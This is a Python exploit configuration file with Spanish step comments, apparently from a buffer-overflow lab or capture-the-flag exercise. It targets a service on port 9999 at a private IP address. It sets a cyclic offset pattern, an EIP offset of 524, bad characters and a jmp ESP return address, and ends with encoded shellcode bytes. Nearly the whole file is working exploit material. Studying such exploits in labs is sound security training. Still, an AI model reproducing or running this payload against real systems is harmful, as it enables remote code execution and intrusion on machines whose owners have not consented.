# PASO I
# ip máquina victima
rhost = '10.10.62.54'

# puerto máquina victima
rport = 9999

# timeout conexión en segundos
timeout = 10

# PASO II
# pattern
pattern = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba'

# PASO III
# offset EIP
offsetEIP = 524

# offset ESP
offsetESP = offsetEIP + 4

# tamaño máximo del relleno del padding final
buffer = 1000

# PASO IV
badchars = [0x00] # badchars = [0x00, 0x0a, 0x0d]
badcharsSequence = bytes(c for c in range(256) if c not in badchars)

# PASO V
# dirección de la operación jmp ESP
jmpESP = 0x311712F3 # jmpESP = 0x11223344

# PASO VI
# subir ESP en la pila (stack)
upESP = b'\x83\xec\x10'
#upESP = b'\x90' * 16

# shellcode
shellcode =  b""
shellcode += b"\xdb\xda\xba\x18\xbb\x99\xfc\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x12\x83\xc3\x04\x31\x53\x13"
shellcode += b"\x03\x4b\xa8\x7b\x09\x5a\x15\x8c\x11\xcf\xea"
shellcode += b"\x20\xbc\xed\x65\x27\xf0\x97\xb8\x28\x62\x0e"
shellcode += b"\xf3\x16\x48\x30\xba\x11\xab\x58\x37\xeb\x9e"
shellcode += b"\x63\x2f\xe9\x20\x94\xcf\x64\xc1\x2a\x49\x27"
shellcode += b"\x53\x19\x25\xc4\xda\x7c\x84\x4b\x8e\x16\x79"
shellcode += b"\x63\x5c\x8e\xed\x54\x8d\x2c\x87\x23\x32\xe2"
shellcode += b"\x04\xbd\x54\xb2\xa0\x70\x16"